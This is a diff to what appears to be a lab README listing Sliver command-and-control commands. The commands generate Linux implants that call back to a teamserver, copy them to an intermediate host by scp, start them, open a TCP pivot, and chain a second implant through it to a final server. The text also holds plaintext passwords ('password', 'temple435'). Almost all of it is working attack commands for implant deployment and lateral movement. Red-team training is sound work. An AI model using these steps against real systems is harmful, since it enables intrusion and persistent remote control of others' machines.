@@ -5,9 +5,11 @@ Make sure to run `sudo systemctl start sliver.service` to get Sliver working
 
 Commands used:\
 Generate Sliver Implant: `generate --os linux --arch arm64 --name [Implant Name] --http [IP of Teamserver]`\
-Copy over to Intermediate server: `scp [Implant Name] Intermediate@[IP of Intermediate Server]:/home/Intermediate/Documents` (Password is 'password')\ 
+Copy over to Intermediate server: `scp [Implant Name] aeverwooddesktop@[IP of Intermediate Server]:/home/aeverwooddesktop/Documents` (Password is 'password')\ 
 Run Implant: `./[Implant Name] &`\
 View sessions: `sessions`\
 Use the Implant: `use [session number]`\
-Create a pivot through that implant: pivots tcp --lport [Pivot Port]\
-Generate an implant for that pivot: `generate --os linux --arch arm64 --tcp-pivot [IP Address of Intermediate Server:[Pivot Port]`\
+Create a pivot through that implant: `pivots tcp --lport [Pivot Port]`\
+Generate an implant for that pivot: `generate --os linux --arch arm64 --tcp-pivot [IP Address of Intermediate Server:[Pivot Port] --name [Pivot Implant Name]`\
+Upload that implant to his desktop with the upload command:
+Use our implant to scp it over to the Final Server: `scp [Pivot Implant Name] aeverwooddesktop@[IP of Final Server]:/home/aeverwooddesktop/Documents` (Password is 'temple435')`\
